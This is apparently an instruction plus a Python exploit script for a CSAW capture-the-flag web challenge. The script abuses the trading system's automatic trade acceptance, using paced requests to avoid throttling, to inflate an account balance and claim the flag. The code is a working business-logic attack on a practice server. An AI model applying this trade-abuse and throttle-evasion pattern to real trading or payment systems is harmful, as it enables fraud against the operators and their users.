Create and run an exploit focusing on the trading system's automatic acceptance mechanism. Here's the strategy:

1. Buy a medium-priced stock that we can afford multiple shares of
2. Post multiple trades of this stock for BURPSHARKHAT before throttling
3. Let the market_scrape bot process these trades
4. Then sell the received BURPSHARKHAT stocks

Here's the template:
```python
import requests
import json
import time
import random

BASE_URL = "http://web.chal.csaw.io:4657"
KEY = f"testuser_{random.randint(1000,9999)}"

def api_request(endpoint, method='GET', data=None):
    try:
        if method == 'GET':
            r = requests.get(f"{BASE_URL}/{endpoint}")
        else:
            r = requests.post(f"{BASE_URL}/{endpoint}", data=data)
        return r.json() if endpoint == 'login' or endpoint == 'listCalls' else r.text
    except:
        return None

def check_balance():
    return api_request('login', 'POST', {"key": KEY})

def get_stocks():
    return api_request('listCalls')

def buy_stock(stock):
    return api_request('buy', 'POST', {"key": KEY, "stock": stock})

def sell_stock(stock):
    return api_request('sell', 'POST', {"key": KEY, "stock": stock})

def trade_stocks(stock1, stock2):
    return api_request('trade', 'POST', {"key": KEY, "stock": stock1, "stock1": stock2})

def get_flag():
    return api_request('flag', 'POST', {"key": KEY})

def exploit_trading():
    print(f"Starting exploit with key: {KEY}")

    # Get initial state and stock prices
    stocks = get_stocks()
    print("Available stocks:", stocks)
    print("Initial balance:", check_balance())

    # Find a medium-priced stock we can buy multiple times
    target_stock = "ELONX"  # Price around $205

    # Buy maximum possible shares of target stock
    shares_to_buy = 8  # Keep under throttle limit
    for _ in range(shares_to_buy):
        result = buy_stock(target_stock)
        print(f"Buy {target_stock} result:", result)
        time.sleep(1)  # Avoid throttling

    print("Balance after buying:", check_balance())

    # Post multiple trades for BURPSHARKHAT
    for _ in range(shares_to_buy):
        result = trade_stocks(target_stock, "BURPSHARKHAT")
        print(f"Trade {target_stock} for BURPSHARKHAT result:", result)
        time.sleep(1)

    # Wait for market_scrape to process trades
    time.sleep(5)
    print("Balance after trading:", check_balance())

    # Try to sell any BURPSHARKHAT we received
    for _ in range(shares_to_buy):
        result = sell_stock("BURPSHARKHAT")
        print("Sell BURPSHARKHAT result:", result)
        time.sleep(1)

    final_balance = check_balance()
    print("Final balance:", final_balance)

    # Try to get flag if balance is sufficient
    if final_balance.get('balance', 0) > 9001:
        flag = get_flag()
        print("Flag result:", flag)
        return flag

    return None

# Run the exploit
exploit_trading()

